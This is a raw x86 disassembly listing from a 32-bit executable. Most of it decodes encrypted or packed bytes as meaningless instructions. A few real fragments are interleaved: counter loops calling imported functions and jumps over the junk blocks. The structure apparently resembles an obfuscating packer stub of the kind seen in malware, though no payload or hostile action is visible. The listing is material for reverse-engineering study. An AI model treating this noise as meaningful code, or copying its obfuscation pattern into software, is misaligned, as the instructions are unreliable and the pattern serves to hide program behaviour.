  407be1:	cmp    BYTE PTR [edx-0x6e1ff7ad],0x84
  407be8:	inc    ebp
  407be9:	ins    BYTE PTR es:[edi],dx
  407bea:	pop    ds
  407beb:	ret    
  407bec:	out    dx,eax
  407bed:	sub    ebx,DWORD PTR [edx-0x3baa2fa0]
  407bf3:	iret   
  407bf4:	push   0x5a
  407bf6:	call   0xd647484d
  407bfb:	adc    al,0xc5
  407bfd:	push   cs
  407bfe:	push   0x57
  407c00:	ins    BYTE PTR es:[edi],dx
  407c01:	std    
  407c02:	lods   eax,DWORD PTR ds:[esi]
  407c03:	mov    DWORD PTR [eax],esp
  407c05:	fld    QWORD PTR [edx-0x3d98cd3c]
  407c0b:	mov    ah,0x2
  407c0d:	add    bl,BYTE PTR [edi]
  407c0f:	das    
  407c10:	mov    dl,dh
  407c12:	push   ebp
  407c13:	data16 ja 0x407bf0
  407c16:	dec    edi
  407c17:	adc    dh,dh
  407c19:	scas   al,BYTE PTR es:[edi]
  407c1a:	aad    0x51
  407c1c:	sub    al,0x82
  407c1f:	dec    esi
  407c20:	and    BYTE PTR [ebx+0x2],0x1b
  407c24:	jmp    0x47f2:0x22655562
  407c2b:	and    ebx,edx
  407c2d:	dec    ebp
  407c2e:	jns    0x407c02
  407c30:	shr    BYTE PTR [ebx-0x208b11b4],cl
  407c36:	pop    esi
  407c37:	or     ecx,DWORD PTR [edi-0x53409d1c]
  407c3d:	xor    DWORD PTR [ecx],edx
  407c3f:	xchg   esp,eax
  407c40:	call   0x5392280f
  407c45:	sub    al,0xc
  407c47:	dec    esp
  407c48:	les    esi,FWORD PTR [ebp-0x6217d95d]
  407c4e:	push   ss
  407c4f:	jmp    0x9ca3441d
  407c54:	inc    esp
  407c55:	sbb    dh,BYTE PTR [ecx+0x6dcde006]
  407c5b:	in     eax,dx
  407c5c:	addr16 dec edx
  407c5e:	inc    ebp
  407c5f:	jns    0x407c72
  407c61:	add    bh,BYTE PTR [esp+ebp*2+0x75aaf78a]
  407c68:	lahf   
  407c69:	je     0x407bec
  407c6b:	shr    DWORD PTR [esi],1
  407c6d:	test   DWORD PTR [esi+0x7],ebx
  407c70:	stc    
  407c71:	(bad)  
  407c72:	xor    esi,edx
  407c74:	lock addr16 out 0x69,al
  407c78:	pop    ebx
  407c79:	into   
  407c7a:	lods   al,BYTE PTR ds:[esi]
  407c7b:	shr    al,1
  407c7d:	push   cs
  407c7e:	mov    dh,BYTE PTR [ebp+0x1e7e12b]
  407c84:	imul   edx,ecx,0xd29e03c2
  407c8a:	adc    al,0x9e
  407c8c:	inc    esp
  407c8d:	push   eax
  407c8e:	add    DWORD PTR [ecx-0x33],esp
  407c91:	ret    
  407c92:	and    DWORD PTR [ecx+0x68ada1cc],esi
  407c98:	shl    BYTE PTR [esi],1
  407c9a:	ss pop es
  407c9c:	jbe    0x407c45
  407c9e:	imul   ebx,DWORD PTR [eax+0x7704b441],0xfd649b39
  407ca8:	jnp    0x407cde
  407caa:	es clc 
  407cac:	int3   
  407cad:	sbb    BYTE PTR [ebx+0x2bee8563],dh
  407cb3:	(bad)  
  407cb5:	mov    ah,BYTE PTR [ecx-0x20a6c6ae]
  407cbb:	cmp    eax,0x1b827785
  407cc0:	mov    ?,WORD PTR [ebp+0x109dc527]
  407cc6:	pop    edx
  407cc7:	pop    ds
  407cc8:	fwait
  407cc9:	int3   
  407cca:	std    
  407ccb:	jbe    0x407d47
  407ccd:	push   cs
  407cce:	push   cs
  407ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cd0:	cs pop ebp
  407cd2:	(bad)  
  407cd3:	(bad)  
  407cd4:	jecxz  0x407d3a
  407cd6:	sub    cl,BYTE PTR [ecx]
  407cd8:	cmp    ah,0x16
  407cdb:	xor    ebx,DWORD PTR [eax+0x51]
  407cde:	jecxz  0x407d13
  407ce0:	push   ds
  407ce1:	daa    
  407ce2:	iret   
  407ce3:	aas    
  407ce4:	es pusha 
  407ce6:	inc    esi
  407ce7:	ficomp DWORD PTR [edi+edx*8]
  407cea:	dec    esi
  407ceb:	xor    ecx,ebp
  407ced:	or     dh,BYTE PTR [ebp+0x1755ab80]
  407cf3:	scas   eax,DWORD PTR es:[edi]
  407cf4:	clc    
  407cf5:	sub    bl,BYTE PTR [esi+eax*1]
  407cf8:	cmc    
  407cf9:	mov    ch,0xa4
  407cfb:	js     0x407d20
  407cfd:	xchg   BYTE PTR [ebx+eiz*8+0x39],bl
  407d01:	mov    cl,0x6d
  407d03:	std    
  407d04:	pop    esi
  407d05:	retf   
  407d06:	gs retf 0x7770
  407d0a:	dec    ebx
  407d0b:	pop    ecx
  407d0c:	fld    TBYTE PTR [ebp+ecx*2-0x6ddde157]
  407d13:	mov    esp,0x426f74ca
  407d18:	dec    ecx
  407d19:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  407d20:	mov    DWORD PTR ds:0x43438e,0x1a
  407d2a:	cmp    DWORD PTR ds:0x43438e,0x0
  407d31:	je     0x407d7e
  407d37:	cmp    DWORD PTR ds:0x43438e,0x7
  407d3e:	jne    0x407d4c
  407d44:	push   0x9
  407d46:	call   DWORD PTR ds:0x4329ce
  407d4c:	cmp    DWORD PTR ds:0x43438e,0x8
  407d53:	jne    0x407d66
  407d59:	mov    edi,DWORD PTR ds:0x43438e
  407d5f:	dec    edi
  407d60:	mov    DWORD PTR ds:0x43438e,edi
  407d66:	mov    edi,DWORD PTR ds:0x43438e
  407d6c:	dec    edi
  407d6d:	mov    DWORD PTR ds:0x43438e,edi
  407d73:	jmp    0x407d2a
  407d78:	adc    DWORD PTR ds:0x432dce,ecx
  407d7e:	mov    edx,DWORD PTR [ebp+0x8]
  407d81:	xor    edx,eax
  407d83:	sbb    edi,DWORD PTR ds:0x43439a
  407d89:	mov    edi,DWORD PTR [ebp-0x10]
  407d8c:	add    edx,ecx
  407d8e:	cmp    edi,edx
  407d90:	jmp    0x407fa4
  407d95:	mov    BYTE PTR [ebp+0x51b14fb4],ch
  407d9b:	jae    0x407e12
  407d9d:	xchg   esp,eax
  407d9e:	xor    al,0x31
  407da0:	xchg   BYTE PTR [esi],bl
  407da2:	lods   al,BYTE PTR ds:[esi]
  407da3:	lods   al,BYTE PTR ds:[esi]
  407da4:	mov    ch,0x4d
  407da6:	retf   0x7070
  407da9:	imul   edi,DWORD PTR [edi+0x70],0x2f318870
  407db0:	xlat   BYTE PTR ds:[ebx]
  407db1:	fwait
  407db2:	ror    DWORD PTR [esi],cl
  407db4:	ja     0x407e05
  407db6:	stos   BYTE PTR es:[edi],al
  407db7:	cmp    BYTE PTR [ebp+0x5a],bh
  407dba:	aad    0x9c
  407dbc:	push   cs
  407dbd:	(bad)  
  407dbe:	push   ds
  407dbf:	adc    eax,0xbd73d610
  407dc4:	nop
  407dc5:	ins    BYTE PTR es:[edi],dx
  407dc6:	add    BYTE PTR [esi+eiz*8],cl
  407dc9:	retf   0xfa03
  407dcc:	jg     0x407d96
  407dce:	lea    edx,[edi+0x6f]
  407dd1:	or     cl,BYTE PTR [ebp-0x3d]
  407dd4:	pop    ss
  407dd5:	pop    ebp
  407dd6:	test   eax,0x949cce64
  407ddb:	in     eax,0xe4
  407ddd:	add    DWORD PTR [ebx+0x585b4f49],edi
  407de3:	push   ebp
  407de4:	je     0x407e1e
  407de6:	lods   eax,DWORD PTR ds:[esi]
  407de7:	xchg   edx,eax
  407de8:	scas   eax,DWORD PTR es:[edi]
  407de9:	xor    BYTE PTR [esi+0x18e29f89],ah
  407def:	fcomp  DWORD PTR [ecx-0x1c1900b7]
  407df5:	jecxz  0x407e09
  407df7:	mov    esi,0x8b288925
  407dfc:	retf   
  407dfd:	inc    esp
  407dfe:	out    0x1d,al
  407e00:	stc    
  407e01:	adc    dh,bl
  407e03:	mov    al,ds:0xf6341c1f
  407e08:	aaa    
  407e09:	jmp    0x407e03
  407e0b:	dec    edi
  407e0c:	xor    BYTE PTR [edx],0xc1
  407e0f:	clc    
  407e10:	adc    dh,bl
  407e12:	pushf  
  407e13:	push   edx
  407e14:	mov    edi,fs
  407e16:	inc    edx
  407e17:	fucomi st,st(3)
  407e19:	mov    edi,0x97eb5072
  407e1e:	inc    edx
  407e1f:	sti    
  407e20:	mov    al,ds:0xb0321722
  407e25:	add    BYTE PTR [ebx],bl
  407e27:	imul   ecx,DWORD PTR [esi+esi*1],0xffffffa4
  407e2b:	sbb    DWORD PTR [eax+0x2c8b70ac],edi
  407e31:	or     DWORD PTR cs:[eax-0x29cb7a9b],ebp
  407e38:	stos   BYTE PTR es:[edi],al
  407e39:	sbb    al,0x3b
  407e3b:	xchg   esp,eax
  407e3c:	stc    
  407e3d:	push   ebp
  407e3e:	push   ebp
  407e3f:	mov    WORD PTR [ebx],fs
  407e41:	xchg   edx,eax
  407e42:	outs   dx,DWORD PTR ds:[esi]
  407e43:	push   eax
  407e44:	push   0x891ad558
  407e49:	inc    esp
  407e4a:	retf   0xbf85
  407e4d:	pop    edi
  407e4e:	or     DWORD PTR [edx-0x2a1eab81],eax
  407e54:	adc    DWORD PTR ds:0x42f5e298,edx
  407e5a:	leave  
  407e5b:	outs   dx,DWORD PTR ds:[esi]
  407e5c:	ja     0x407ecb
  407e5e:	sub    al,0xd3
  407e60:	test   BYTE PTR [ebx],al
  407e62:	repnz xor eax,0xbb01865f
  407e68:	test   eax,0x9bea8c30
  407e6d:	or     esp,DWORD PTR [edi+esi*4-0x54342d7]
  407e74:	stos   DWORD PTR es:[edi],eax
  407e75:	xor    ah,dl
  407e77:	pop    esi
  407e78:	imul   ecx,DWORD PTR [edi+0x2b2b4b08],0xc
  407e7f:	pop    esp
  407e80:	xchg   ebp,eax
  407e81:	sbb    cl,al
  407e83:	aaa    
  407e84:	ss jg  0x407e91
  407e87:	popa   
  407e88:	test   al,0x2d
  407e8a:	jg     0x407e21
  407e8c:	(bad)  
  407e8d:	stos   DWORD PTR es:[edi],eax
  407e8e:	out    dx,eax
  407e8f:	repnz pop ds
  407e91:	mov    ah,0xa4
  407e93:	push   esp
  407e94:	in     al,dx
  407e95:	jbe    0x407f07
  407e97:	mov    es,WORD PTR [ecx-0x76]
  407e9a:	sahf   
  407e9b:	mov    ebx,0xba4d4381
  407ea0:	and    eax,0x49eacd83
  407ea5:	jno    0x407e78
  407ea7:	sub    dl,BYTE PTR [edi-0x339301bc]
  407ead:	fisubr WORD PTR [edi-0x792406bd]
  407eb3:	(bad)
  407eb7:	or     cl,BYTE PTR [esi+ecx*4-0x3d]
  407ebb:	lock xor ecx,ebp
  407ebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ebf:	in     al,dx
  407ec0:	mov    eax,0xd890a805
  407ec5:	jl     0x407e97
  407ec7:	dec    ecx
  407ec8:	sub    cl,bh
  407eca:	xchg   DWORD PTR [ebp-0x78009044],esi
  407ed0:	cmp    eax,0x4874e304
  407ed5:	repz cs imul edx,ecx,0xc707f5be
  407edd:	in     eax,dx
  407ede:	sbb    dh,al
  407ee0:	jae    0x407ee4
  407ee2:	cwde   
  407ee3:	rcr    DWORD PTR [eax+0x1b],cl
  407ee6:	out    dx,al
  407ee7:	xchg   ebp,eax
  407ee8:	rcr    DWORD PTR [ecx+0x2347dbbd],0xa0
  407eef:	dec    edi
  407ef0:	xchg   ebp,eax
  407ef1:	stc    
  407ef2:	sub    bl,BYTE PTR [esi+ebp*2-0x687298e0]
  407ef9:	(bad)  
  407efa:	loop   0x407eb8
  407efc:	pop    esi
  407efd:	inc    ecx
  407efe:	push   0xffffff95
  407f00:	aam    0x3a
  407f02:	into   
  407f03:	and    edi,ecx
  407f05:	cs popa 
  407f07:	repnz mov ah,0x1b
  407f0a:	adc    BYTE PTR [ecx],bh
  407f0c:	out    0xe6,al
  407f0e:	jns    0x407f7e
  407f10:	ja     0x407eb9
  407f12:	xchg   ebp,eax
  407f13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f14:	gs sbb al,0x64
  407f17:	ds call 0xfd91:0x4e10ea62
  407f1f:	sbb    DWORD PTR [edi],eax
  407f21:	cmp    al,BYTE PTR [esi]
  407f23:	fwait
  407f24:	cmp    cl,al
  407f26:	iret   
  407f27:	inc    edx
  407f28:	push   eax
  407f29:	sbb    eax,0x66b374ba
  407f2e:	pop    ss
  407f2f:	test   eax,0xad619be4
  407f34:	cdq    
  407f35:	retf   0x1108
  407f38:	shl    DWORD PTR [ebx],1
  407f3a:	sbb    ebp,DWORD PTR [edi-0x2d6f880c]
  407f40:	dec    ebx
  407f41:	test   eax,0xfd7278f7
  407f46:	pop    ss
  407f47:	mov    eax,0xa3c103a4
  407f4c:	mov    ch,0x64
  407f4e:	das    
  407f4f:	dec    esi
  407f50:	call   DWORD PTR [ecx]
  407f52:	cli    
  407f53:	push   ebx
  407f54:	push   cs
  407f55:	xchg   esp,eax
  407f56:	jb     0x407f4f
  407f58:	fldenv [edx-0x74]
  407f5b:	lock int 0xfe
  407f5e:	dec    edx
  407f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f60:	outs   dx,BYTE PTR ds:[esi]
  407f61:	out    0x15,al
  407f63:	jnp    0x407ef8
  407f65:	jl     0x407f31
  407f67:	pop    esp
  407f68:	rcr    edi,cl
  407f6a:	in     al,0x35
  407f6c:	inc    esi
  407f6d:	fbstp  TBYTE PTR [ebp-0x1c2862c6]
  407f73:	jmp    0xbc3c52ac
  407f78:	mov    ebx,DWORD PTR [ebx+0x717cc1b4]
  407f7e:	add    DWORD PTR [esi],ebx
  407f80:	loop   0x407f1d
  407f82:	inc    ebp
  407f83:	mov    dh,0x4c
  407f85:	mov    ch,0x5b
  407f87:	mov    ds:0x2702e268,al
  407f8c:	and    eax,edx
  407f8e:	and    bh,bh
  407f90:	fs mov ch,0xea
  407f93:	rcr    DWORD PTR [eax+0x4f],cl
  407f96:	inc    ebx
  407f97:	outs   dx,DWORD PTR ds:[esi]
  407f98:	test   eax,0x78033372
  407f9d:	jecxz  0x407f59
  407f9f:	jmp    0x840f:0x8c43c8dd
  407fa6:	dec    ecx
  407fa7:	sbb    eax,0xc7530000
  407fac:	add    eax,0x43437a
  407fb1:	cmp    ah,BYTE PTR [eax+eax*1+0x0]
  407fb5:	jmp    0x409aba
  407fba:	mov    DWORD PTR ds:0x432708,0x445
  407fc4:	mov    edx,DWORD PTR [ebp-0x8]
  407fc7:	and    DWORD PTR ds:0x43438a,0x0
  407fd1:	jmp    0x407fe5
  407fd6:	xor    edi,edi
  407fd8:	or     edi,DWORD PTR ds:0x43438a
  407fde:	inc    edi
  407fdf:	mov    DWORD PTR ds:0x43438a,edi
  407fe5:	cmp    DWORD PTR ds:0x43438a,0x18
  407fec:	jae    0x40802f
  407ff2:	cmp    DWORD PTR ds:0x43438a,0xc
  407ff9:	jne    0x40800a
  407fff:	push   0x7154
  408004:	call   DWORD PTR ds:0x432c3e
  40800a:	cmp    DWORD PTR ds:0x43438a,0xb
  408011:	jne    0x408024
  408017:	mov    edi,DWORD PTR ds:0x43438a
  40801d:	inc    edi
  40801e:	mov    DWORD PTR ds:0x43438a,edi
  408024:	jmp    0x407fd6
  408029:	xor    DWORD PTR ds:0x43439e,ecx
  40802f:	mov    edi,DWORD PTR [ebp-0x10]
  408032:	jmp    0x408246
  408037:	(bad)  
  408038:	jmp    0x408005
  40803a:	adc    ebp,DWORD PTR [ecx+0x33]
  40803d:	inc    esi
  40803e:	jno    0x40804f
  408040:	pushf  
  408041:	jo     0x407fca
  408043:	xchg   ebp,eax
  408044:	into   
  408045:	in     eax,dx
  408046:	mov    DWORD PTR [esi-0x38],0x7f697070
  40804d:	jo     0x4080bf
  40804f:	scas   al,BYTE PTR es:[edi]
  408050:	mov    edx,0x23971492
  408055:	cmp    BYTE PTR [edx],bl
  408057:	adc    eax,0x6700cdda
  40805c:	je     0x408081
  40805e:	(bad)  
  40805f:	push   ds
  408060:	fs loop 0x407fef
  408063:	push   ebp
  408064:	mov    esp,0xe553f316
  408069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40806a:	push   esp
  40806b:	mov    DWORD PTR [ecx-0x123adec],0x2f1bf9c
  408075:	leave  
  408076:	mul    BYTE PTR [ecx+0x338a6cf]
  40807c:	out    0x56,al
  40807e:	repnz test eax,0x46ab0828
  408084:	stos   DWORD PTR es:[edi],eax
  408085:	xchg   edi,eax
  408086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408087:	mov    ds:0xbfccb2b6,eax
  40808c:	pop    esi
  40808d:	shr    BYTE PTR [edx-0x12a4fbaa],1
  408093:	mov    bh,0x60
  408095:	inc    ebp
  408096:	dec    edi
  408097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408098:	inc    ecx
  408099:	sbb    DWORD PTR [edx+0x61],esi
  40809c:	icebp  
  40809d:	jle    0x40804c
  40809f:	cld    
  4080a0:	ss out 0xed,al
  4080a3:	lods   al,BYTE PTR ds:[esi]
  4080a4:	loop   0x408107
  4080a6:	cmp    DWORD PTR [ecx-0x4c71e291],eax
  4080ac:	(bad)  [esi]
  4080ae:	add    bh,bh
  4080b0:	sbb    ah,bl
  4080b2:	xchg   esi,eax
  4080b3:	loop   0x4080ab
  4080b5:	pop    esp
  4080b6:	mov    cl,0x2c
  4080b8:	mov    BYTE PTR [edi-0x25],cl
  4080bb:	xchg   BYTE PTR ds:0x7503cd6e,ah
  4080c1:	and    DWORD PTR [edi-0x7d],ebp
  4080c4:	mov    bh,BYTE PTR [eax-0x433323d9]
  4080ca:	and    ch,ch
  4080cc:	mov    bh,0xb5
  4080ce:	xchg   edi,eax
  4080cf:	popf   
  4080d0:	in     al,0x29
  4080d2:	or     BYTE PTR [ecx],ah
  4080d4:	mov    ch,0xd2
  4080d6:	in     eax,0x4c
  4080d8:	push   esp
  4080d9:	sub    dh,BYTE PTR [ebx-0x41]
  4080dc:	add    eax,0xa754f68e
  4080e1:	adc    edx,ecx
  4080e3:	lods   eax,DWORD PTR ds:[esi]
  4080e4:	cs bswap edi
  4080e7:	outs   dx,BYTE PTR ds:[esi]
  4080e8:	clc    
  4080e9:	shl    BYTE PTR [edx],cl
  4080eb:	xor    al,0xcd
  4080ed:	xor    eax,0x70c4a452
  4080f2:	repz leave 
  4080f4:	or     DWORD PTR [esi],edi
  4080f6:	sub    al,0x7c
  4080f8:	out    dx,eax
  4080f9:	mov    ah,0xc9
  4080fb:	call   0x2fb766b4
  408100:	adc    ebx,DWORD PTR [ecx]
  408102:	cmp    al,0xab
  408104:	cld    
  408105:	push   edx
  408106:	fwait
  408107:	int3   
  408108:	xchg   esi,eax
  408109:	inc    ebp
  40810a:	mov    bh,0x81
  40810c:	aas    
  40810d:	cld    
  40810e:	rcl    DWORD PTR [esi],cl
  408110:	fimul  WORD PTR [edi]
  408112:	inc    esp
  408113:	jl     0x40813b
  408115:	jnp    0x408193
  408117:	aaa    
  408118:	ret    0xb791
  40811b:	out    dx,eax
  40811c:	xor    dh,BYTE PTR [ebp+0x25832c78]
  408122:	fwait
  408123:	mov    cl,cl
  408125:	push   cs
  408126:	inc    esi
  408127:	popf   
  408128:	mov    al,0x5e
  40812a:	fsubr  QWORD PTR [esi]
  40812c:	jmp    0xb5b93288
  408131:	sbb    bl,BYTE PTR [esi]
  408133:	sbb    eax,DWORD PTR [edi]
  408135:	and    dh,BYTE PTR [edi-0xd11bfcf]
  40813b:	mov    bl,0xd9
  40813d:	ficomp DWORD PTR [esi+edi*8]
  408140:	xchg   DWORD PTR [esi+0x42],edi
  408143:	cld    
  408144:	fisubr WORD PTR [edi+0x61ceaff9]
  40814a:	clc    
  40814b:	cmp    esp,edi
  40814d:	xor    al,0x86
  40814f:	jbe    0x4080d1
  408151:	ss mov edx,0x256d4c2b
  408157:	popf   
  408158:	sahf   
  408159:	fcom   st(7)
  40815b:	sti    
  40815c:	add    DWORD PTR [edi],ebp
  40815e:	repz in al,0xea
  408161:	xchg   ebx,eax
  408162:	scas   al,BYTE PTR es:[edi]
  408163:	icebp  
  408164:	pop    ss
  408165:	sub    eax,0xfc626294
  40816a:	nop
  40816b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40816c:	jnp    0x4081a2
  40816e:	push   edx
  40816f:	inc    ax
  408171:	fsub   st,st(4)
  408173:	add    DWORD PTR [eax+eax*4-0x78],0x2a
  408178:	cwde   
  408179:	pop    esi
  40817a:	mov    ebp,0xd49f2cae
  40817f:	div    DWORD PTR [ecx]
  408181:	jmp    0x4081df
  408183:	cmp    DWORD PTR [edx+esi*1+0x7d],ebx
  408187:	jbe    0x408183
  408189:	mov    cl,0x40
  40818b:	pop    ecx
  40818c:	inc    esp
  40818d:	addr16 popa 
  40818f:	push   eax
  408190:	sti    
  408191:	sub    BYTE PTR [edi+0x5e],cl
  408194:	pop    ebp
  408195:	jmp    0x4081bc
  408197:	mov    esi,0xd2e3fabd
  40819c:	adc    DWORD PTR ds:0xe8baeaa3,edi
  4081a2:	xchg   ebx,eax
  4081a3:	inc    eax
  4081a4:	stos   DWORD PTR es:[edi],eax
  4081a5:	xchg   edi,esp
  4081a7:	sbb    DWORD PTR [edi-0x5a6a8e8a],0x5d
  4081ae:	push   esi
  4081af:	xor    edx,esp
  4081b1:	dec    ecx
  4081b2:	div    DWORD PTR [edx]
  4081b4:	and    ebx,0xffffffff
  4081b7:	(bad)  
  4081b8:	pop    edi
  4081b9:	pop    ss
  4081ba:	lock inc eax
  4081bc:	sbb    al,0x6a
  4081be:	jne    0x408174
  4081c0:	mov    dl,BYTE PTR [edx+0x73]
  4081c3:	mov    esi,DWORD PTR [ebx]
  4081c5:	sti    
  4081c6:	push   ebp
  4081c7:	or     al,0xb9
  4081c9:	adc    BYTE PTR [edx],al
  4081cb:	pop    ebx
  4081cc:	add    dh,ch
  4081ce:	xchg   ebx,eax
  4081cf:	imul   eax,DWORD PTR [edx],0xa1068e22
  4081d5:	fistp  DWORD PTR [esi-0x59db064f]
  4081db:	rcr    BYTE PTR [bx+di+0x1],cl
  4081df:	loopne 0x4081a7
  4081e1:	(bad)  
  4081e2:	mov    ecx,0x5df4a29b
  4081e7:	outs   dx,BYTE PTR ds:[esi]
  4081e8:	aas    
  4081e9:	mov    al,ds:0xf7e70b84
  4081ee:	push   cs
  4081ef:	aaa    
  4081f0:	jno    0x40820b
  4081f2:	sbb    dh,dh
  4081f4:	push   ecx
  4081f5:	out    0xe,al
  4081f7:	pop    esp
  4081f9:	retf   0x52c9
  4081fc:	xchg   ecx,eax
  4081fd:	inc    esi
  4081fe:	and    eax,0x9a3f23b4
  408203:	pop    ebx
  408204:	cdq    
  408205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408206:	dec    ecx
  408207:	add    dh,BYTE PTR [esi+0x64]
  40820a:	push   ebp
  40820b:	pushf  
  40820c:	mov    ebx,0x33965858
  408211:	xchg   esp,eax
  408212:	sti    
  408213:	adc    DWORD PTR [edx-0x45],edi
  408216:	rcl    BYTE PTR [esi-0x48],1
  408219:	push   eax
  40821a:	push   0xffffffe6
  40821c:	(bad)  
  40821d:	xchg   esp,eax
  40821e:	dec    eax
  40821f:	popa   
  408220:	or     eax,0x78cd8a0e
  408225:	inc    esp
  408226:	mov    eax,ds:0xdaf7b744
  40822b:	lahf   
  40822c:	add    al,bh
  40822e:	mov    al,ds:0x9262324e
  408233:	shl    DWORD PTR [ecx-0x70f03174],cl
  408239:	lahf   
  40823a:	dec    edi
  40823b:	aam    0x5d
  40823d:	cli    
  40823e:	repnz push 0xcf6c0dfb
  408244:	out    dx,eax
  408245:	jecxz  0x408272
  408247:	cli    
  408248:	mov    edx,DWORD PTR [ebp-0x4]
  40824b:	xor    edx,eax
  40824d:	sbb    DWORD PTR ds:0x432de2,0x10fd
  408257:	add    edx,ecx
  408259:	mov    DWORD PTR ds:0x434372,0xe69
  408263:	cmp    edi,edx
  408265:	mov    DWORD PTR ds:0x434386,0xfd5
  40826f:	jmp    0x408483
  408274:	sbb    DWORD PTR [edi+eiz*4],ebp
  408277:	pop    edx
  408278:	mov    ch,0x71
  40827a:	loope  0x4082e7
  40827c:	push   ebx
  40827d:	inc    edx
  40827e:	test   al,0x19
  408280:	fs inc eax
  408282:	pop    ds
  408283:	cmp    DWORD PTR [edi+0x697070d6],0x7f
  40828a:	jo     0x4082fc
  40828c:	add    esi,0xb363219e
  408292:	stos   BYTE PTR es:[edi],al
  408293:	pop    eax
  408294:	push   esi
  408295:	jmp    0xb8c2:0x9262c790
  40829c:	out    0x45,al
  40829e:	sub    al,0x20
  4082a0:	add    eax,edx
  4082a2:	inc    edi
  4082a3:	ror    ebp,0xfe
  4082a6:	pop    esp
  4082a7:	push   ecx
  4082a8:	iret   
  4082a9:	daa    
  4082aa:	mov    bl,0xf9
  4082ac:	xor    al,0x62
  4082ae:	dec    eax
  4082af:	fisttp WORD PTR [esi-0x1b2ea8ec]
  4082b5:	push   eax
  4082b6:	mov    WORD PTR [esi-0x6f4d3e7c],?
  4082bc:	jne    0x4082d8
  4082be:	xchg   esp,eax
  4082bf:	cmp    eax,0x977b1131
  4082c4:	test   DWORD PTR [edx-0x2],ebx
  4082c7:	enter  0x4f59,0x1b
  4082cb:	jp     0x408293
  4082cd:	add    BYTE PTR [edi],0x8e
  4082d0:	sbb    DWORD PTR [ebp-0x57],ebp
  4082d3:	xchg   esi,eax
  4082d4:	out    dx,al
  4082d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082d6:	xor    BYTE PTR [ebp+0x6fb1358c],ah
  4082dc:	inc    ebx
  4082dd:	jl     0x408284
  4082df:	clc    
  4082e0:	add    edx,edi
  4082e2:	popf   
  4082e3:	jnp    0x408273
  4082e5:	or     BYTE PTR [ebp+0x37645a],0x69
  4082ec:	inc    eax
  4082ed:	or     al,BYTE PTR [ebp-0x7e]
  4082f0:	push   cs
  4082f1:	test   DWORD PTR [eax+0x77],0xfc5ae2cb
  4082f8:	pop    es
  4082f9:	scas   al,BYTE PTR es:[edi]
  4082fa:	mov    BYTE PTR [edi-0x5b146ae4],ch
  408300:	xchg   esp,eax
  408301:	xchg   ecx,eax
  408302:	data16 jae 0x4082fe
  408305:	dec    ecx
  408306:	sbb    eax,0x13146624
  40830b:	mov    ecx,ebp
  40830d:	pop    ebp
  40830e:	or     bl,BYTE PTR [ebx-0x41]
  408311:	cli    
  408312:	cli    
  408313:	retf   
  408314:	icebp  
  408315:	retf   0x5e9d
  408318:	leave  
  408319:	push   esi
  40831a:	jecxz  0x4082ef
  40831c:	ds leave 
  40831e:	xchg   esp,eax
  40831f:	mov    ds:0x16753804,al
  408324:	fnstsw WORD PTR ds:0x5beab617
  40832a:	les    edi,FWORD PTR [esi]
  40832c:	jmp    0xa4d7:0x1449a07f
  408333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408334:	test   DWORD PTR [ebx],eax
  408336:	dec    ebp
  408337:	jns    0x4082ed
  408339:	call   0x5585d523
  40833e:	movq   mm3,mm4
  408341:	loope  0x4082de
  408343:	mov    WORD PTR [edi+edx*8-0x7b],ds
  408347:	push   ecx
  408348:	(bad)  
  408349:	xor    al,0xe9
  40834b:	fiadd  WORD PTR [eax]
  40834d:	sub    eax,0xd8ccd503
  408352:	loope  0x408302
  408354:	sub    DWORD PTR [eax-0x2686e157],edx
  40835a:	push   0xe8d8e55a
  40835f:	gs (bad) 
  408361:	jb     0x408311
  408363:	jge    0x408366
  408365:	jl     0x4082ff
  408367:	test   eax,0xa454b1ec
  40836c:	ss push esp
  40836e:	cmp    eax,0x5db9bbe4
  408373:	hlt    
  408374:	mov    edi,0xee35a202
  408379:	jg     0x408351
  40837b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40837c:	add    al,0x40
  40837e:	sub    eax,0xe16859c
  408383:	je     0x4083a3
  408385:	cmp    ecx,0x2c0ccde
  40838b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40838c:	cmp    al,0x76
  40838e:	xor    BYTE PTR [ebx-0x69],bh
  408391:	mov    edi,0x3f9227b0
  408396:	cli    
  408397:	cmp    BYTE PTR [ecx+esi*8],ch
  40839a:	mov    BYTE PTR [edi-0x4fcdd1f9],ch
  4083a0:	add    eax,DWORD PTR [esi+eiz*4+0x1d]
  4083a4:	xchg   edi,eax
  4083a5:	shr    BYTE PTR [ecx+0x18a7eb7f],1
  4083ab:	inc    esi
  4083ac:	dec    ecx
  4083ad:	loopne 0x40834c
  4083af:	add    al,0xc6
  4083b1:	imul   ecx,DWORD PTR [edx-0x3b132ade],0x24
  4083b8:	adc    DWORD PTR [ecx+0x36],eax
  4083bb:	push   ds
  4083bc:	rcl    al,1
  4083be:	sbb    BYTE PTR [edx+eax*4+0x43183f9c],al
  4083c5:	loop   0x408404
  4083c7:	ins    BYTE PTR es:[edi],dx
  4083c8:	aam    0xbc
  4083ca:	call   0xdbd4d604
  4083cf:	dec    esi
  4083d0:	in     al,0x3e
  4083d2:	cmp    al,0xdd
  4083d4:	xlat   BYTE PTR ds:[ebx]
  4083d5:	test   bl,dl
  4083d7:	in     al,dx
  4083d8:	scas   eax,DWORD PTR es:[edi]
  4083d9:	(bad)  
  4083da:	mov    al,0xe8
  4083dc:	xchg   esi,eax
  4083dd:	neg    BYTE PTR [edx+0x42]
  4083e0:	mov    ebp,0x8c7772e4
  4083e5:	push   ebx
  4083e6:	add    BYTE PTR [ecx],0xfb
  4083e9:	shl    eax,0x3d
  4083ec:	jno    0x408441
  4083ee:	pop    ds
  4083ef:	pop    ecx
  4083f0:	aam    0xa0
  4083f2:	sar    BYTE PTR [edi+0x311d399c],1
  4083f8:	jge    0x408427
  4083fa:	jg     0x4083cb
  4083fc:	int    0xb9
